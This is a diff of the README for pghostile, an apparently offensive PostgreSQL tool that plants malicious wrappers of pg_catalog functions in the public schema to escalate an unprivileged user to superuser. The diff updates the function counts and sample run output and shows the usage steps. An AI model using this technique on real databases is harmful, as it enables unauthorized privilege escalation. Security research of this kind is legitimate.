@@ -10,7 +10,7 @@ Considering that an unprivileged user can create functions in the public schema 
 
 In a few words, pghostile searches pg_catalog for functions that can be overridden and creates a malicious wrapper of them in the public schema.  
 
-Currently, it can identify ~360 functions/parameters combinations that can lead to privilege escalation. To give an example, the list below contains some of these functions:  
+Currently, it can identify ~500 functions/parameters combinations that can lead to privilege escalation. To give an example, the list below contains some of these functions:  
 ```SQL
 select sha256('randstr');
 select unnest(array [1, 2]);
@@ -74,14 +74,14 @@ pghostile.py user1 testdb -H 10.211.55.12
 ```
 Starting ... 
 
-[ * ] 666 interesting functions have been identified
+[ * ] 762 interesting functions have been identified
 [ * ] Creating test functions
 [ * ] Testing functions
 [ * ] Deleting test functions
 [ * ] Creating exploit functions
-[ * ] Done! 518 functions have been created
+[ * ] Done! 594 functions have been created
 
-365 exploitable functions and params combinations have been tested!
+433 exploitable functions and params combinations have been tested!
 The './out' folder contains the output
 ```
 
@@ -97,9 +97,9 @@ psql -U postgres testdb < extension_queries.sql
 ```
 3. Check if you are superuser
 ```sql
-SELECT rolsuper FROM pg_roles where rolname='user1';
+SELECT rolsuper FROM pg_roles where rolname='user1'
 ```
-4. If you are superuser, all the functions that triggered the exploit are listed in
+4. If you are superuser, all the functions that triggered the exploit are listed in:
 ```sql
 select * from pghostile.triggers
 ```
